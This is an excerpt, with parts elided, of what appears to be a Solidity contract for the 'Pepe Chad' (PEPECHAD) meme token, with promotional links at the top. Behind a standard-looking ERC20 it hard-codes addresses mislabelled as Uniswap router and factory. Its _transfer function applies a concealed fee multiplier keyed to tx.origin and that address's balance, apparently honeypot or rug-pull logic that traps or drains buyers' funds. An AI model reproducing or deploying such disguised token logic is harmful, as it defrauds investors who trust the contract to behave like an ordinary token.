...
https://twitter.com/PepeChadCoinBNB
https://t.me.com/PepeChadCoinBNB
https://PepeChadCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2uniswapRouter = 0x186B262CE785c6B8d7391E6eB86E16ED39AcdF01;
    uint256 private _allowanceEnabled = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private factoryV2Uniswap = 0x71d000a5b06B9396765830290dEB45B2305f99eE;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[factoryV2Uniswap] > 0 ? _pairsAllowance : _allowanceEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract PepeChadCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Pepe Chad", unicode"PEPECHAD")
    {
